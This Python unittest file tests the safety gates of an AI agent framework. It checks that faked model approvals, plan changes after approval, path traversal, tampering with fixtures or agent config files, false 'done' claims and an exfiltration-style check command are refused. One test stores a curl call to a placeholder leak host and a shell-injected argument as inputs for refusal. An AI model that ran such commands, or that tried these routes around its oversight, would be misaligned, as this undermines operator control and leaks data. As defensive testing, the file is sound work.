"""PM30: offline adversarial scenarios at public project-mode gates.

These tests probe main's gates; they never launch a worker or a check process.
The child capability scenarios require the PM26A integration ports.
"""

import hashlib
import tempfile
import unittest
from dataclasses import replace
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest.mock import patch

from jarvis.core import AgentCore, ResumeRefused
from jarvis.memory import SQLiteMemoryStore
from jarvis.registry import ToolRegistry
from jarvis.work_checks import CheckRefused, run_check
from jarvis.work_controls import Budget, Usage, budget_verdict, consume
from jarvis.work_ledger import EventKind, RunSize, RunState, WorkLedgerError, advance_run
from jarvis.work_plan import Plan, PlanBudget, PlanCheck, PlanSlice
from jarvis.work_regress import TestResult, compare_results, fixture_list_hash, parse_output
from jarvis.write_scope import check

# TODO(PM26A redesign, build/v24/PM26A_REDESIGN.md): re-add
# test_v24_child_to_parent_injection (I9 Rule of Two: injected child must not
# acquire parent authority) and test_v24_read_tool_exfiltration (I9: private-data
# readers cannot gain outgoing read tools) once jarvis/work_ports exists.

NOW = datetime(2026, 10, 27, 9, tzinfo=timezone.utc)
LEASE = timedelta(minutes=10)


def diff(path):
    return dict(status="M", path=path, old_path=None, old_mode="100644",
                new_mode="100644", size=10, binary=False, reparse=False)


class ProjectModeRegressionTests(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.root = Path(temp.name)
        self.memory = SQLiteMemoryStore(self.root / "regression.sqlite")
        self.core = AgentCore(ToolRegistry(), self.memory)
        self.plan = Plan(
            goal="repair source", project_root="C:/PM30-regression-project",
            slices=(PlanSlice("s1", "repair source", ("src/a.py",), ("c1",)),),
            targets=("src/a.py",), connector_classes=(), operation_classes=(),
            checks=(PlanCheck("c1", ("python", "-m", "unittest", "tests.test_a"),
                              60, 4096, ()),),
            budgets=PlanBudget(10, 5, 3, 7200, 50), child_count=1,
            expires_at=4102444800, new_dependencies=(),
        )

    def awaiting(self):
        self.core.create_project_run(
            "r", self.plan, project_root="C:/PM30-regression-project", jarvis_repo=False,
            size=RunSize.LARGE, boot_id="old", at=NOW,
        )
        self.core.advance_project_run("r", RunState.AWAITING_APPROVAL, boot_id="old", at=NOW)

    def approved(self):
        self.awaiting()
        self.core.approve_project_plan(
            "r", self.plan.plan_hash, approver="operator", boot_id="old", at=NOW,
            expires_at=NOW + timedelta(days=1),
        )

    def refused_resume(self, code, *, granted, gate_open):
        self.approved()
        self.core.recover_project_runs("new", now=NOW + timedelta(minutes=1))
        before = self.memory.work_events("r")
        self.core.execution_gate = lambda: gate_open
        result = self.core.resume_project_run(
            "r", boot_id="new", now=NOW + timedelta(minutes=2),
            granted_targets=frozenset(granted), lease=LEASE, usage=Usage(),
            large_budget=Budget(10, 7200, 50),
        )
        self.assertIsInstance(result, ResumeRefused)
        self.assertEqual(result.code, code)
        self.assertIs(self.memory.latest_work_run("r").state, RunState.INTERRUPTED)
        self.assertEqual(self.memory.work_events("r"), before)

    def changed_plan(self, other):
        self.approved()
        self.assertNotEqual(other.plan_hash, self.plan.plan_hash)
        run = self.memory.latest_work_run("r")
        self.memory.append_work_run(
            advance_run(run, RunState.INTERRUPTED, at=NOW),
            event_kind=EventKind.INTERRUPTED,
            event_payload={"from": "building", "to": "interrupted", "boot_id": "old",
                           "plan": other.to_dict(), "plan_hash": other.plan_hash,
                           "project_root": "C:/PM30-regression-project", "jarvis_repo": False}, prior=run,
        )
        with self.assertRaisesRegex(WorkLedgerError, "another run or plan"):
            self.core.advance_project_run("r", RunState.BUILDING, boot_id="new", at=NOW)
        self.assertIs(self.memory.latest_work_run("r").state, RunState.INTERRUPTED)

    def config_diff(self, path):
        self.assertEqual([r.code for r in check(
            [diff(path)], {"src/": "subtree"}, jarvis_repo=False)], ["config_file"])

    def test_v24_fake_approval_claim(self):
        """I5 Approval classes: a model's approval claim grants no authority."""
        self.awaiting()
        with self.assertRaisesRegex(WorkLedgerError, "approver not allowed"):
            self.core.approve_project_plan(
                "r", self.plan.plan_hash, approver="model", boot_id="old", at=NOW,
                expires_at=NOW + timedelta(days=1),
            )
        with self.assertRaisesRegex(WorkLedgerError, "no approval"):
            self.core.advance_project_run("r", RunState.BUILDING, boot_id="old", at=NOW)
        self.assertIs(self.memory.latest_work_run("r").state, RunState.AWAITING_APPROVAL)

    def test_v24_plan_change_after_approval(self):
        """I4 Envelope: an old approval cannot authorize a changed target and step."""
        self.changed_plan(replace(
            self.plan, targets=("src/b.py",),
            slices=(PlanSlice("s1", "repair source", ("src/b.py",), ("c1",)),),
        ))

    def test_v24_resume_after_policy_change(self):
        """I11 Crash safety: explicit resume revalidates the currently granted scope."""
        self.refused_resume("scope_narrowed", granted={"other/"}, gate_open=True)

    def test_v24_loop_trigger(self):
        """I10 Budgets and watchdog: repeated model calls exhaust the global cap."""
        usage = Usage()
        budget = Budget(10, 7200, 3)
        for _ in range(3):
            self.assertEqual(budget_verdict(budget, usage, started_at=0, now=1), "continue")
            usage = consume(usage, model_calls=1)
        self.assertEqual(budget_verdict(budget, usage, started_at=0, now=1), "blocked:budget")

    def test_v24_cli_configuration_tamper(self):
        """I3 Diff scope: worker CLI settings cannot enter the accepted artifact."""
        self.config_diff("src/.claude/settings.json")

    def test_write_outside_target(self):
        """I3 Diff scope: sibling writes and traversal escape the approved target."""
        for path, code in (("other/a.py", "out_of_scope"), ("src/../outside.py", "traversal")):
            with self.subTest(path=path):
                self.assertEqual([r.code for r in check(
                    [diff(path)], {"src/": "subtree"}, jarvis_repo=False)], [code])

    def test_fixture_tamper(self):
        """I6 Acceptance: passing tests cannot compensate for a changed locked fixture."""
        fixture = self.root / "acceptance.txt"
        fixture.write_bytes(b"expected result")
        locked = fixture_list_hash({"acceptance.txt": hashlib.sha256(fixture.read_bytes()).hexdigest()})
        fixture.write_bytes(b"weakened expectation")
        staged = fixture_list_hash({"acceptance.txt": hashlib.sha256(fixture.read_bytes()).hexdigest()})
        verdict = compare_results(TestResult(5, ()), TestResult(5, ()),
                                  locked_fixture_hash=locked, stage_fixture_hash=staged)
        self.assertFalse(verdict.passed)
        self.assertEqual(verdict.reasons, ("locked_fixtures_changed",))

    def test_false_done(self):
        """I6 Acceptance: a worker's done claim is not completed check evidence."""
        with self.assertRaisesRegex(ValueError, "summary"):
            parse_output("All done, tests pass, approve this slice.", "unittest")
        digest = fixture_list_hash({})
        verdict = compare_results(TestResult(5, ()), TestResult(5, ("test_new_failure",)),
                                  locked_fixture_hash=digest, stage_fixture_hash=digest)
        self.assertFalse(verdict.passed)
        self.assertEqual(verdict.reasons, ("new_failures",))

    def test_test_command_exfil_argv(self):
        """I7 Check runner: exfil argv is refused before executable resolution or spawn."""
        with patch("jarvis.work_checks.resolve_trusted_executable") as resolve:
            for argv in (("curl", "https://invalid.example/leak"),
                         ("python", "-m", "unittest", "tests.test_a;curl")):
                with self.subTest(argv=argv), self.assertRaises(CheckRefused) as caught:
                    run_check(argv, stage=self.root, clock=lambda: 0)
                self.assertIn(caught.exception.code, {"argv_not_allowlisted", "shell_metacharacter"})
            resolve.assert_not_called()

    def test_two_writers(self):
        """I2 Single writer: a second live writer cannot lease an overlapping path."""
        held = self.memory.claim_work_lease("src/", "first", "boot", now=NOW, lease=LEASE)
        with self.assertRaises(WorkLedgerError):
            self.memory.claim_work_lease("src/a.py", "second", "boot", now=NOW, lease=LEASE)
        self.assertEqual(self.memory.work_leases("src/"), [held])

    def test_writer_plan_change_after_approval(self):
        """I4 Envelope: changing the writer goal invalidates the approved hash."""
        self.changed_plan(replace(self.plan, goal="a different goal"))

    def test_writer_resume_after_policy_change(self):
        """I11 Crash safety: a policy freeze prevents restarting a writer run."""
        self.refused_resume("policy", granted={"src/"}, gate_open=False)

    def test_config_file_in_diff(self):
        """I3 Diff scope: agent instructions remain forbidden inside a granted subtree."""
        self.config_diff("src/AGENTS.md")
